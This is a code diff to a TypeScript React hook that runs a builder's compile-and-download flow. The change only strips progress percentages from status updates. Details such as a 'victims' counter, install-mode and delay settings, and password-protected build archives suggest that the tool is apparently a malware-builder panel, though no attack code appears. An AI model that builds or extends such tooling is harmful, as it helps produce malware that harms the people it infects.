@@ -48,22 +48,21 @@ export function useBuilderBuildFlow(opts: {
          if (!active) return;
 
          buildingRef.current = true;
-         setBuildingUi(true, "Building", 0);
+         setBuildingUi(true, "Building");
 
          try {
             await waitCompileDone(active.jobId, {
                onTick: (st) => {
                   const s = String(st?.status || "");
-                  const pct = typeof st?.progress === "number" ? st.progress : s === "pending" ? 5 : s === "running" ? 35 : 0;
-                  if (s === "running") setBuildingUi(true, "Building", pct);
-                  if (s === "pending") setBuildingUi(true, "Building", pct);
+                  if (s === "running") setBuildingUi(true, "Building");
+                  if (s === "pending") setBuildingUi(true, "Building");
                },
             });
 
             const shouldFinalize = markJobFinalized(login, active.jobId);
             if (shouldFinalize) {
                const { blob, filename } = await downloadCompileResult(active.jobId, active.name);
-               setBuildingUi(true, "Build complete!", 100);
+               setBuildingUi(true, "Build complete!");
                downloadBlob(blob, filename);
             }
 
@@ -87,7 +86,7 @@ export function useBuilderBuildFlow(opts: {
 
             resetBuilderDefaults(setIconBase64, setDelay, setInstallMode);
 
-            setBuildingUi(false, "Building", 0);
+            setBuildingUi(false, "Building");
             if (shouldFinalize) {
                openBuildModal(active.password);
             }
@@ -96,7 +95,7 @@ export function useBuilderBuildFlow(opts: {
                clearActiveBuild(login);
             } catch {
             }
-            setBuildingUi(false, "Building", 0);
+            setBuildingUi(false, "Building");
          } finally {
             buildingRef.current = false;
          }
@@ -200,7 +199,7 @@ export function useBuilderBuildFlow(opts: {
       buildingRef.current = true;
       const password = generateArchivePassword();
 
-      setBuildingUi(true, "Building", 0);
+      setBuildingUi(true, "Building");
 
       try {
          const resolved = await resolveAccountLogin();
@@ -232,17 +231,11 @@ export function useBuilderBuildFlow(opts: {
             created,
          });
 
-         await waitCompileDone(jobId, {
-            onTick: (st) => {
-               const s = String(st?.status || "");
-               const pct = typeof st?.progress === "number" ? st.progress : s === "pending" ? 5 : s === "running" ? 35 : 0;
-               setBuildingUi(true, "Building", pct);
-            },
-         });
+         await waitCompileDone(jobId);
 
          const { blob, filename } = await downloadCompileResult(jobId, buildName);
 
-         setBuildingUi(true, "Build complete!", 100);
+         setBuildingUi(true, "Build complete!");
 
          downloadBlob(blob, filename);
          const buildEntry: BuildHistoryItem = { name: buildName, id: buildId, version: "0.22.2", created, victims: 0 };
@@ -256,10 +249,10 @@ export function useBuilderBuildFlow(opts: {
 
          resetBuilderDefaults(setIconBase64, setDelay, setInstallMode);
 
-         setBuildingUi(false, "Building", 0);
+         setBuildingUi(false, "Building");
          openBuildModal(password);
       } catch (err) {
-         setBuildingUi(false, "Building", 0);
+         setBuildingUi(false, "Building");
 
          try {
             clearActiveBuild(login);
